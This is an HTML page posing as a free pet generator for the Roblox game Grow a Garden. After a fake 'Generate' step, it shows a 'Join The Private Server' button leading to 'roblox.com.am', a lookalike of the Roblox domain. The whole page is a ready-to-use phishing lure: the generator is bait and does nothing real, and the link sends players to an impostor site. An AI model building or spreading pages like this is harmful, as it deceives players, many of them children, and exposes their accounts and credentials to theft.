<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <title>Grow A Garden — Pet Generator (mobile replica)</title>
  <style>
    :root{
      --bg-top:#5fc0ff;
      --bg-bottom:#1da0e6;
      --card:#ffffff;
      --card-shadow: 0 18px 40px rgba(6,18,30,0.25);
      --muted:#94a3b8;
      --accent-start:#ff7a2d;
      --accent-end:#ff4f1a;
      --pill-bg: rgba(0,0,0,0.04);
    }
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;color:#0b1720}

    body{
      background:linear-gradient(180deg,var(--bg-top),var(--bg-bottom));
      display:flex;align-items:center;justify-content:center;padding:28px;
      -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
    }

    .viewport{width:360px;max-width:94vw;display:flex;align-items:center;justify-content:center}

    .card{
      width:320px;
      background:var(--card);
      border-radius:12px;
      box-shadow:var(--card-shadow);
      padding:14px 14px 18px 14px;
      display:flex;flex-direction:column;gap:10px;align-items:center;
    }

    .username-row{align-self:flex-start;display:flex;gap:8px;align-items:center}
    .username-tag{font-size:12px;color:#334155;background:var(--pill-bg);padding:6px 10px;border-radius:8px;border:1px solid rgba(2,6,12,0.03)}
    /* reduced width to prevent spilling; max-width keeps it responsive */
    .username-input{font-size:13px;padding:8px;border-radius:8px;border:1px solid rgba(2,6,12,0.06);width:130px;max-width:calc(100% - 110px)}

    h1{font-size:15px;margin:4px 0 6px;text-align:center;color:#0b1720}

    .pet-list{display:flex;gap:10px;align-items:center;justify-content:center;padding:6px 4px}
    .pet{width:68px;height:68px;border-radius:10px;background:#fbfbfb;border:1px solid rgba(3,10,18,0.04);display:flex;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;transition:transform .12s, box-shadow .12s;padding:6px}
    .pet img{width:48px;height:48px;object-fit:contain}
    .pet .lbl{font-size:11px;margin-top:6px;color:#334155}
    .pet.selected{box-shadow:0 10px 22px rgba(255,120,40,0.15);border:2px solid var(--accent-end);transform:translateY(-3px)}

    .generate{width:100%;display:flex;justify-content:center}
    .btn-generate{width:120px;padding:10px;border-radius:10px;border:0;background:linear-gradient(90deg,var(--accent-start),var(--accent-end));color:#fff;font-weight:800;cursor:pointer}

    .profile{width:100%;margin-top:6px;background:#f1f7fb;border-radius:10px;padding:12px;min-height:54px;border:1px solid rgba(2,6,12,0.03);display:flex;align-items:center;justify-content:center;color:#475569;font-size:13px}

    .join-btn{display:none;margin-top:8px;padding:10px 12px;border-radius:10px;border:0;background:#10b981;color:#fff;font-weight:700;cursor:pointer}

    .page-dot{position:absolute;left:calc(50% - 170px);transform:translateY(-18px);width:44px;height:44px;background:rgba(0,0,0,0.08);border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,0.08)}

    @media(max-width:360px){ .viewport{width:94vw} .card{width:92vw} }
  </style>
</head>
<body>
  <div class="viewport" role="main">
    <div style="position:relative;display:flex;align-items:center;justify-content:center;">
      <div class="page-dot" aria-hidden="true"></div>
      <section class="card" aria-label="Grow A Garden — Pet Generator">
        <div class="username-row">
          <span class="username-tag" id="usernameTag">TEEBOX_GAMING</span>
          <input id="usernameInput" class="username-input" placeholder="Enter username" aria-label="username input">
        </div>
        <h1>Grow A Garden — Pet Generator</h1>

        <div class="pet-list" role="list" aria-label="Pet options" id="petList">
          <!-- options injected by JS -->
        </div>

        <div class="generate"><button class="btn-generate" id="genBtn">Generate</button></div>
        <div class="profile" id="profile">Your profile will appear here.</div>

        <!-- The join button appears after generate. Clicking it opens the private server URL. -->
        <button id="joinBtn" class="join-btn">Join The Private Server</button>

      </section>
    </div>
  </div>

  <script>
    // minimal interactive behavior with image buttons
    const pets = [
      {id:'raccoon', name:'Raccoon', img:'raccoon.png', alt:'raccoon'},
      {id:'dragonfly', name:'Dragonfly', img:'download-removebg-preview.png', alt:'dragonfly'},
      {id:'kitsune', name:'Kitsune', img:'noFilter.png', alt:'kitsune'},
      {id:'queenbee', name:'Queen Bee', img:'queenbeees.png', alt:'queen bee'}
    ];

    const petList = document.getElementById('petList');
    const profile = document.getElementById('profile');
    const usernameTag = document.getElementById('usernameTag');
    const usernameInput = document.getElementById('usernameInput');
    const joinBtn = document.getElementById('joinBtn');
    let selected = null;

    // The private server URL the button will open. Change to your real URL.
    const PRIVATE_SERVER_URL = 'https://www.roblox.com.am/games/126884695634066/Grow-a-Garden?privateServerLinkCode=78194531090954011282727274480934';

    function makePet(p){
      const btn = document.createElement('button');
      btn.className = 'pet';
      btn.type = 'button';
      btn.setAttribute('role','listitem');
      btn.innerHTML = `<img src="${p.img}" alt="${p.alt}"><div class="lbl">${p.name}</div>`;
      btn.addEventListener('click', ()=>{
        document.querySelectorAll('.pet').forEach(x=>x.classList.remove('selected'));
        btn.classList.add('selected');
        selected = p;
        renderPreview();
      });
      return btn;
    }

    function renderPreview(){
      profile.innerHTML = '';
      if(!selected){
        profile.innerHTML = '<div style="text-align:center;color:#9aa3ab">No selection</div>';
        return;
      }
      const username = usernameInput.value.trim() || usernameTag.textContent;
      usernameTag.textContent = username;
      profile.innerHTML = `<div style="display:flex;align-items:center;gap:12px"><div style="width:62px;height:62px;border-radius:10px;background:#fff;display:flex;align-items:center;justify-content:center;font-size:34px"><img src="${selected.img}" alt="${selected.alt}" style="width:48px;height:48px;object-fit:contain"></div><div><div style="font-weight:700">${selected.name}</div><div style="color:var(--muted);font-size:13px">${username}</div></div></div>`;
    }

    pets.forEach(p => petList.appendChild(makePet(p)));

    document.getElementById('genBtn').addEventListener('click', ()=>{
      // update username display
      const username = usernameInput.value.trim();
      if(username) usernameTag.textContent = username;

      if(!selected){
        profile.innerHTML = '<div style="color:#ef4444;font-weight:700">Please select a pet first</div>';
        return;
      }

      // show generated profile
      profile.innerHTML = `<div style="display:flex;gap:12px;align-items:center"><div style="width:78px;height:78px;border-radius:10px;background:#fff;display:flex;align-items:center;justify-content:center;font-size:40px"><img src="${selected.img}" alt="${selected.alt}" style="width:64px;height:64px;object-fit:contain"></div><div><div style="font-weight:800;font-size:15px">${usernameTag.textContent}</div><div style="color:var(--muted);margin-top:6px">${selected.name} • Generated profile</div></div></div>`;

      // reveal the join button
      joinBtn.style.display = 'block';

      // Optional: automatically click join after a short delay (uncomment if desired).
      // setTimeout(()=> joinBtn.click(), 800);
    });

    // When the join button is clicked, open the private server URL in a new tab/window
    joinBtn.addEventListener('click', ()=>{
      // Open in new tab
      window.open(PRIVATE_SERVER_URL, '_blank');

      // If you prefer to redirect current page instead, use:
      // window.location.href = PRIVATE_SERVER_URL;
    });

    // Accessibility: allow Enter to trigger Generate when focused on username input
    usernameInput.addEventListener('keydown', (e)=>{ if(e.key === 'Enter'){ e.preventDefault(); document.getElementById('genBtn').click(); } });
  </script>
</body>
</html>
